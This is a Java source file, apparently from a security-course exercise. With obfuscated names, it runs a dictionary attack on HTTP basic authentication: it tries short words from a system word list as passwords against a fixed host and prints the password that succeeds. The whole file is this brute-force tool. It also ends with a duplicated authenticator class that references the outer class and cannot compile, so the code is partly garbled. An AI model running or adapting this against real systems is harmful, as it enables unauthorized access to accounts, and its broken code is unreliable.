import java.net.PasswordAuthentication;
import java.net.URL;
import java.net.HttpURLConnection;
import java.net.Authenticator;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.Vector;
public class Dictionary {
    boolean f00;
    int f10;
    Vector f20;
    Dictionary() {
        this.f00 = false;
        this.f20 = new Vector();
        this.f10 = 0;
        this.m10();
        this.m00();
    }
    public void m00() {
        while ( this.f10 < this.f20.size() ) {
            this.f00 = this.m20();
            if ( this.f00 ) {
                System.out.print ( "The password is: " );
                System.out.println ( this.f20.elementAt ( this.f10 - 1 ) );
                this.f10 = this.f20.size();
            }
        }
    }
    public void m10() {
        try {
            final BufferedReader bufferedReader = new BufferedReader ( new FileReader ( "/usr/share/lib/dict/words" ) );
            for ( String s = bufferedReader.readLine(); s != null; s = bufferedReader.readLine() ) {
                if ( s.length() <= 3 ) {
                    this.f20.addElement ( s );
                }
            }
        } catch ( IOException ex ) {}
    }
    public boolean m20() {
        Authenticator.setDefault ( new MyAuthenticator() );
        try {
            final HttpURLConnection httpURLConnection = ( HttpURLConnection ) new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            httpURLConnection.connect();
            if ( httpURLConnection.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException ex ) {}
        return false;
    }
    public static void main ( final String[] array ) {
        final Dictionary dictionary = new Dictionary();
    }
    class MyAuthenticator extends Authenticator {
        @Override
        protected PasswordAuthentication getPasswordAuthentication() {
            final String s = "";
            final String s2 = Dictionary.this.f20.elementAt ( Dictionary.this.f10 );
            ++Dictionary.this.f10;
            return new PasswordAuthentication ( s, s2.toCharArray() );
        }
    }
}
class MyAuthenticator extends Authenticator {
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        final String s = "";
        final String s2 = Dictionary.this.f20.elementAt ( Dictionary.this.f10 );
        ++Dictionary.this.f10;
        return new PasswordAuthentication ( s, s2.toCharArray() );
    }
}
